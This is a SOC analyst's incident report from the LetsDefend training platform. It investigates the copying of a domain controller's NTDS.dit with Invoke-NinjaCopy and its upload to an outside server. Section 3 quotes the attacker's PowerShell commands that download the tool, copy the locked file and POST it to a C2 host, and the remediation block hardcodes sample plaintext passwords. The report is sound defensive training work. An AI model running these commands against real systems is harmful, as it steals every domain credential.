# SOC314 - Unauthorized Access to NTDS.dit - Incident Report

**Analyst:** Stevan Mrkšić · **Platform:** LetsDefend · **Alert:** SOC314 · **EventID:** 292 · **Date:** 2024-08-23

| Field | Value |
|---|---|
| Rule | Unauthorized Access to ntds.dit |
| Severity | High → **Critical** (reassessed, see §7) |
| Host | Paul · 172.16.17.223 · Windows 10 · Domain: LetsDefend |
| EDR Action | Allowed |
| Alert time | 2024-08-23 12:19 PM |
| **Verdict** | **True Positive - NTDS.dit exfiltrated; full domain credential compromise** |

---

## 1. Alert summary

PowerShell on host Paul downloaded `Invoke-NinjaCopy.ps1` (PowerSploit / Empire) and used it to copy `ntds.dit` from the Domain Controller via Direct Volume Access - bypassing NTFS locks. The file was then exfiltrated to an attacker-controlled C2 server via HTTP POST. `ntds.dit` contains the NTLM hashes of every domain account. All domain credentials must be treated as compromised.

---

## 2. Triage questions

1. Is this a planned red team or pentest exercise?
2. Which process chain spawned PowerShell - is the parent process legitimate?
3. What is the hash of `Invoke-NinjaCopy.ps1` and how does it score on VT?
4. Was `ntds.dit` successfully exfiltrated, or only copied locally?
5. What post-exfiltration actions are required to invalidate stolen hashes?

---

## 3. Investigation

**3.1 Suspicious process chain**

Endpoint telemetry shows:

```
RuntimeBroker.exe → powershell.exe → (script execution)
```

`RuntimeBroker.exe` is a legitimate Windows process that manages sandboxed apps (UWP/MSIX), but it is not a legitimate parent for PowerShell. This parent-child relationship indicates process injection or abuse of RuntimeBroker as a launcher - a common technique to obscure the true origin of a PowerShell execution.

**3.2 Invoke-NinjaCopy download**

At **12:19 PM**, a PowerShell command was executed to download `Invoke-NinjaCopy.ps1` from the official PowerSploit GitHub repository:

```powershell
Invoke-WebRequest -Uri "https://raw.githubusercontent[.]com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-NinjaCopy.ps1" -OutFile "C:\temp\Invoke-NinjaCopy.ps1"
```

**Invoke-NinjaCopy.ps1 SHA256:** `975803E4B80DB0C3B3C8A1E8074DA3F5A5C77C710CBF96DE38CAF9744DD76C9B`
VirusTotal: **38/65 malicious** - family labels include: PowerSploit, Empire, Hacktool, PS/Exfiltration.

The file `C:\temp\Invoke-NinjaCopy.ps1` (434 KB) was present at time of investigation with a creation time of 12:19 PM.

**3.3 NTDS.dit copied via Direct Volume Access**

Invoke-NinjaCopy uses the Windows Volume Shadow Copy service and raw volume access to read files that are locked by the operating system (such as `ntds.dit`, which the Domain Controller holds open at all times). The PowerShell command:

```powershell
Invoke-NinjaCopy -Path "C:\Windows\NTDS\ntds.dit" -LocalDestination "C:\temp\ntds.dit"
```

bypassed the NTFS lock by reading the file directly from the raw volume device, circumventing standard file access controls. The copied `ntds.dit` file was found in `C:\temp\` at investigation time: size **10,256 KB**, creation time **11:40 AM** - the timestamp indicates the copy was made before the PowerShell download, suggesting a prior reconnaissance phase or access to the DC through another vector.

**3.4 Exfiltration confirmed**

Following the local copy, the attacker exfiltrated `ntds.dit` to a C2 server via HTTP POST:

```powershell
Invoke-WebRequest -Uri "https://185.107.56[.]72:8000/upload" -Method POST -InFile "C:\temp\ntds.dit"
```

Network action logs confirm outbound connections from Paul (172.16.17.223):
- **12:19 PM**: → 195.199.111.133:443 (C2 - PowerSploit download proxy or staging server)
- **12:20 PM**: → 185.107.56[.]72:443 (C2 exfil receiver - `upload` endpoint)

`ntds.dit` contains the NTLM hashes of every domain account in the LetsDefend Active Directory domain, including all privileged accounts (domain admins, service accounts, krbtgt). These hashes can be used offline for Pass-the-Hash attacks, offline cracking, or Kerberos Golden Ticket generation.

---

## 4. IOCs

| Type | Value | Notes |
|---|---|---|
| SHA256 | 975803E4B80DB0C3B3C8A1E8074DA3F5A5C77C710CBF96DE38CAF9744DD76C9B | Invoke-NinjaCopy.ps1 - 38/65 VT malicious |
| IPv4 | 195.199.111[.]133 | C2 - outbound connection 12:19 PM |
| IPv4 | 185.107.56[.]72 | C2 - exfil receiver (POST /upload) |
| URL | hxxps://185.107.56[.]72:8000/upload | NTDS.dit exfiltration endpoint |
| URL | hxxps://raw.githubusercontent[.]com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-NinjaCopy.ps1 | Script download source |
| File | C:\temp\Invoke-NinjaCopy.ps1 | 434 KB; created 12:19 PM |
| File | C:\temp\ntds.dit | 10,256 KB; created 11:40 AM |
| Host | Paul / 172.16.17.223 | Compromised host |

---

## 5. MITRE ATT&CK

| Tactic | Technique | Notes |
|---|---|---|
| Execution | T1059.001 - Command and Scripting Interpreter: PowerShell | PowerShell used for download, copy, and exfil *(PDF lists T1059 - T1059.001 is the applicable sub-technique)* |
| Credential Access | T1006 - Direct Volume Access | Invoke-NinjaCopy bypasses NTFS locks via raw volume read |
| Credential Access | T1003.003 - OS Credential Dumping: NTDS | ntds.dit copied and exfiltrated |
| Command & Control | T1105 - Ingress Tool Transfer | Invoke-NinjaCopy.ps1 downloaded from GitHub to victim host |
| Exfiltration | T1041 - Exfiltration Over C2 Channel | ntds.dit POSTed to 185.107.56[.]72:8000/upload |
| Exfiltration | T1071.001 - Application Layer Protocol: Web Protocols | Exfiltration over HTTPS *(not in PDF - added; more specific than T1041 alone)* |

---

## 6. Timeline

| Time | Event |
|---|---|
| 2024-08-23 11:40 AM | ntds.dit copy found in C:\temp\ (creation timestamp - prior reconnaissance phase) |
| 12:19 PM | Invoke-NinjaCopy.ps1 downloaded to C:\temp\ (RuntimeBroker.exe → PowerShell) |
| 12:19 PM | PowerShell contacts 195.199.111.133:443 |
| 12:19 PM | Invoke-NinjaCopy executed - ntds.dit copied via Direct Volume Access |
| 12:20 PM | **ntds.dit POSTed to 185.107.56[.]72:8000/upload** - exfiltration confirmed |
| 12:19 PM | SOC314 alert fires |

---

## 7. Verdict

**True Positive - NTDS.dit exfiltrated.**

`ntds.dit` was successfully copied from the Domain Controller and exfiltrated to an attacker-controlled C2 server. This file contains the NTLM hashes of every domain account in the LetsDefend Active Directory environment. The attacker now possesses material for:
- **Pass-the-Hash** attacks against any domain resource without knowing plaintext passwords
- **Offline hash cracking** (weak passwords will be recovered)
- **Kerberos Golden Ticket attacks** - the `krbtgt` hash enables the creation of forged Kerberos tickets valid for the entire domain, providing unlimited, persistent access that survives password resets of individual accounts

**Severity reassessed: Critical.** The theft of `ntds.dit` is equivalent to the theft of every domain credential simultaneously. This is a full domain compromise.

---

## 8. Containment & escalation

**Immediate:**
- Isolate Paul (172.16.17.223) from the network immediately.
- Block 195.199.111[.]133 and 185.107.56[.]72 at the perimeter firewall.

**Escalate to L2 / IR immediately.** This is a full-domain credential compromise - beyond standard L1 scope.

**Critical remediation - krbtgt double reset (Golden Ticket mitigation):**

The `krbtgt` account hash is the key to Golden Ticket attacks. A single reset is insufficient because the domain retains one generation of the previous hash. The correct procedure:

```powershell
# Reset krbtgt password - ROUND 1
Set-ADAccountPassword -Identity krbtgt -NewPassword (ConvertTo-SecureString -AsPlainText "ComplexPassword1!" -Force) -Reset

# Wait for replication to propagate to all DCs (minimum 10 hours in most environments)
# Then reset again - ROUND 2 (this invalidates any tickets signed with the old hash)
Set-ADAccountPassword -Identity krbtgt -NewPassword (ConvertTo-SecureString -AsPlainText "ComplexPassword2!" -Force) -Reset
```

**Full domain credential rotation:**
- Reset all privileged domain accounts (Domain Admins, Enterprise Admins, Schema Admins, service accounts).
- Reset all user account passwords - the ntds.dit dump exposes all of them.
- Rotate all service account passwords and Kerberos service tickets (KTPASS).

**Eradication:**
- Remove `C:\temp\Invoke-NinjaCopy.ps1` and `C:\temp\ntds.dit` from Paul.
- Audit the Domain Controller for signs of direct compromise - the ntds.dit timestamp (11:40 AM) predates the download log (12:19 PM), indicating a possible earlier access path that needs investigation.
- Enable PowerShell ScriptBlock Logging (EventID 4104) and Constrained Language Mode across the domain.

**Detection hardening:**
- Alert on any process accessing `ntds.dit` or `SYSTEM` hive files via VSS or raw volume handles (Sysmon EID 11 for ntds.dit path, EID 7 for VSSAdmin-related DLL loads).
- Restrict PowerShell execution policy and log all `Invoke-WebRequest` / `Invoke-RestMethod` calls in security-relevant paths.

---

*Report part of LetsDefend SOC Analyst L2 portfolio. Analyst: Stevan Mrkšić | GitHub: slim92code*
